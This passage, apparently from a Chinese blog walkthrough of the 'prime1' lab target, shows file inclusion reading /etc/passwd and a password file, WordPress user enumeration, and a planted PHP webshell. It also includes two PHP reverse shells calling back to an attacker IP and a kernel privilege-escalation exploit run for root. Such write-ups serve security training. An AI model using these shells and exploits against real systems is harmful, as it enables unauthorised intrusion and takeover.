Server,,,:/nonexistent:/bin/false</span><br><span class="line">saket:x:1001:1001:find password.txt file in my directory:/home/saket:</span><br><span class="line">sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
+<p>这里成功读取了该文件，说明这里存在文件包含<br><code>saket:x:1001:1001:find password.txt file in my directory:/home/saket:</code>注意到这个用户，这里说他的家目录下有password.txt，尝试查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo curl  http://192.168.1.101/image.php?secrettier360=file:///home/saket/password.txt</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">finaly you got the right parameter&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;follow_the_ippsec</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>得到一个<code>follow_the_ippsec</code>密码，尝试登录<br>使用所有账户登录未果，先记录下来后面再利用</p>
+<h3 id="WordPress扫描"><a href="#WordPress扫描" class="headerlink" title="WordPress扫描"></a>WordPress扫描</h3><p>首先使用wpscan进行扫描<br><code>sudo wpscan --url http://192.168.1.101/wordpress -e u </code><br>使用<code>man wpscan</code>可以获取wpscan的帮助，这里用-e u指定暴露用户<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749370362206.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749370539385.png"><br>这里扫描出了一个victor用户，尝试用该用户和前面的密码登录后台victor&#x2F;follow_the_ippsec,前面扫描时也出现了&#x2F;wordpress&#x2F;wp-admin&#x2F;,该路径即为后台地址</p>
+<h3 id="获得wordpress后台权限"><a href="#获得wordpress后台权限" class="headerlink" title="获得wordpress后台权限"></a>获得wordpress后台权限</h3><p>成功登录后台<br>wordpress可利用的点主要是插件，主题<br>简单测试一下插件是否可以上传，先写个一句话，然后打包成zip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($GET_[a]); ?&gt;&quot; &gt; shell.php  </span><br><span class="line">zip shell shell.php</span><br></pre></td></tr></table></figure>
+<p>Unable to create directory wp-content&#x2F;uploads&#x2F;2025&#x2F;06. Is its parent directory writable by the server?<br>提示插件不可上传<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749371303432.png"><br>在主题编辑下找到一个secret.php，里面的内容提升，终于你找到一个可以写的文件了，说明必然是该文件可以利用了，结合上期的php反弹shell脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.114/5555 0&gt;&amp;1&#x27;&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.1.114&quot;</span>,<span class="number">443</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里两个脚本用哪个都可以<br>现在问题是找这个主题的路径，根据前面wpscan扫描的结果<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749372025444.png"><br>可知最终路径为<code>http://192.168.1.101/wordpress/wp-content/themes/twentynineteen/secret.php</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749372078120.png"><br>成功获取www-data的用户权限</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试sudo和suid提权无果<br>定时任务也没有可以写入的文件<br>尝试内核提权，先查看内核版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<p>用searchsploit搜索一下相关信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo searchsploit Linux ubuntu 4.10.0-28</span><br><span class="line">------------------------------------------------------------------------ ---------------------------</span><br><span class="line"> Exploit Title                                                          |  Path</span><br><span class="line">------------------------------------------------------------------------ ---------------------------</span><br><span class="line">Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free    | linux/dos/43234.c</span><br><span class="line">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Esca | linux/local/45010.c</span><br><span class="line">Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privi | linux/local/41760.txt</span><br><span class="line">------------------------------------------------------------------------ ---------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+<p>后两个是提权的，我们下载第二个来看看<br>里面提示直接gcc编译运行即可，我们用python起一个http服务，<code>python -m http.server</code>之后在靶机上用wget下载到&#x2F;tmp下即可<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749373743119.png"><br>之后运行45010<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749373795335.png"><br>已经成功提权了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先在目录扫描得到提示用fuzz，fuzz之后获得了一个文件包含，按照提示得到一个密码，并用该密码和测试出来的wordpress用户进入了wordpress的后台，再后台找到一个可以写入的php文件，写入反弹shell从而获得一个www的用户权限，最终利用内核提权拿到root权限。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">端口发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">2.</span> <span class="toc-text">目录爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">开始渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">3.1.</span> <span class="toc-text">模糊测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.</span> <span class="toc-text">WordPress扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97wordpress%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90"><span class="toc-number">3.3.</span> <span class="toc-text">获得wordpress后台权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&text=靶场实战：prime1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&is_video=false&description=靶场实战：prime1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶场实战：prime1&body=Check out this article: https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&title=靶场实战：prime1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&name=靶场实战：prime1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2025/06/08/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Aprime1/&t=靶场实战：prime1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    ta3shi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
